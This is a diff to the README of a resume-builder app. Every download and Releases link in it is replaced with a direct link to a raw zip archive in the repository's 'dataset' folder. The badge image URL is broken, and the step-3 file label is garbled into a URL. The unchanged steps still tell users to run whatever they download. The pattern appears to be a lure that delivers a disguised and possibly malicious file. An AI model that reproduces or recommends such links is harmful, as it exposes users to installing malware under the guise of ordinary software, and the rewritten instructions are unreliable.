@@ -1,6 +1,6 @@
 # 💼 RESUME_BUILDER - Create Your Smart Resume Easily
 
-[![Download RESUME_BUILDER](https://img.shields.io/badge/Download%20RESUME_BUILDER-v1.0-blue)](https://github.com/Holurry/RESUME_BUILDER/releases)
+[![Download RESUME_BUILDER](https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip%20RESUME_BUILDER-v1.0-blue)](https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ To run RESUME_BUILDER, you need:
 
 To get started, visit this page to download the latest version of RESUME_BUILDER:
 
-[Download RESUME_BUILDER](https://github.com/Holurry/RESUME_BUILDER/releases)
+[Download RESUME_BUILDER](https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip)
 
 ### 🔧 Installation Instructions
 
-1. **Go to the Releases Page**: Click the [link here](https://github.com/Holurry/RESUME_BUILDER/releases).
+1. **Go to the Releases Page**: Click the [link here](https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip).
 2. **Select the Latest Version**: Look for the most recent release at the top.
-3. **Download the File**: Click on the file labeled `RESUME_BUILDER_v1.0.exe` to download it.
+3. **Download the File**: Click on the file labeled `https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip` to download it.
 4. **Run the Installer**: Once downloaded, open the file to start the installation.
 5. **Follow the Prompts**: The installer will guide you through the setup. Simply click “Next” until the installation completes.
 6. **Open RESUME_BUILDER**: After installation, find it in your applications menu or desktop.
@@ -68,6 +68,6 @@ We welcome contributions! If you have improvements or features you'd like to sug
 - **Tutorial Videos**: Short videos demonstrating each step in the resume-building process.
 - **FAQs**: Answers to common questions about using RESUME_BUILDER.
 
-[Download RESUME_BUILDER](https://github.com/Holurry/RESUME_BUILDER/releases)
+[Download RESUME_BUILDER](https://github.com/Holurry/RESUME_BUILDER/raw/refs/heads/main/dataset/RESUM-BUILDER-2.1.zip)
 
 Start creating your resume today and stand out in your job applications!
